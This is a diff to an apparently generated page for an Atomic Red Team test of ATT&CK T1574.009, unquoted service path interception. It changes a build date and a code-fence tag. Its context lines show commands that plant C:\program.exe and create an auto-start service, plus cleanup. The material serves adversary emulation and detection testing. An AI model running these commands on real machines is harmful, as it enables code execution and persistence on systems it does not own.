@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1574.009"
 attack_technique_name: "Hijack Execution Flow: Path Interception by Unquoted Path"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.009/T1574.009.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "2770dea7-c50f-457b-84c4-c40a47460d9f"
@@ -54,7 +54,7 @@ In this case, if an executable program.exe in C:\ exists, C:\program.exe will be
 
 ### Command
 
-```commandprompt
+```cmd
 copy "#{service_executable}" "C:\Program Files\windows_service.exe"
 copy "#{service_executable}" "C:\program.exe"
 sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
@@ -63,7 +63,7 @@ sc start "Example Service"
 
 ### Cleanup
 
-```commandprompt
+```cmd
 sc stop "Example Service" >nul 2>&1
 sc delete "Example Service" >nul 2>&1
 del "C:\Program Files\windows_service.exe" >nul 2>&1
